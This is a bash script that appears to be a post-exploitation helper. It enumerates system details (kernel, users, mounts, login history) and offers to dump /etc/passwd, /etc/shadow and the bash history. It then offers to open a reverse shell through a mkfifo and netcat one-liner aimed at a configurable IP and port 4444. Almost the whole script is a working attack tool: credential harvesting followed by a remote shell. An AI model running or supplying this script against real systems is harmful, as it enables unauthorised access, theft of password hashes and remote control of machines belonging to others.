#!/usr/bin/env bash

IPADDR=127.0.0.1
PORT=4444

echo "System settings"
if [ -a /etc/motd ] ; then
    echo "Message of the Day";
    cat /etc/motd | grep -ve '^#.*$' | sed -e 's/^/    /'
fi
if [ -a /etc/resolv.conf ] ; then
    echo "Nameservers:"
    cat /etc/resolv.conf | grep -ve '^#.*$' | sed -e 's/^/    /'
fi
if [ -a /etc/issue ] ; then
    echo "Distro:"
    cat /etc/issue | grep -ve '^#.*$' | sed -e 's/^/    /'
fi
echo
echo "Kernel info:"
uname -a | sed -e 's/^/    /'
echo
echo "User info:"
id | sed -e 's/^/    /'
echo
echo "Who is connected, uptime and load avg:"
w  | sed -e 's/^/    /'
echo
echo "Mount info:"
df -k  | sed -e 's/^/    /'
echo
echo "Last users:"
last -a  | sed -e 's/^/    /'

echo 
echo
echo "================================="
echo
FILES=(/etc/passwd /etc/shadow ~/.bash_history)
TEST=-1
echo "Would you like to look at following files:"
for file in ${FILES[*]}; do
    if [ -a $file ] ; then
        echo $file | sed -e 's/^/    /'
    fi
done
while [ $TEST -eq -1 ] ; do
    read  -rsp "Response [y/n]:" -n1 key
    if [ "$key" = "y" ] ; then
        TEST=1
    elif [ "$key" = "n" ] ; then
        TEST=2
    fi
done

if [ $TEST -eq 1 ] ; then
    for file in ${FILES[*]}; do
        if [ -a $file ] ; then
            cat $file | grep -ve '^#.*$' | less
        fi
    done
fi



echo
echo
echo
echo "Would you like to start a reverse shell?"
TEST=-1
while [ $TEST -eq -1 ] ; do
    read -rsp "Response [y/n]:" -n1 key
    if [ "$key" = "y" ]; then
        TEST=1
    elif [ "$key" = "n" ] ; then
        TEST=2
    fi
done
if [ $TEST -eq 1 ] ; then
    BASH=`which bash`
    rm /tmp/f
    mkfifo /tmp/f
    cat /tmp/f | $BASH -i 2>&1 | nc $IPADDR $PORT > /tmp/f
fi
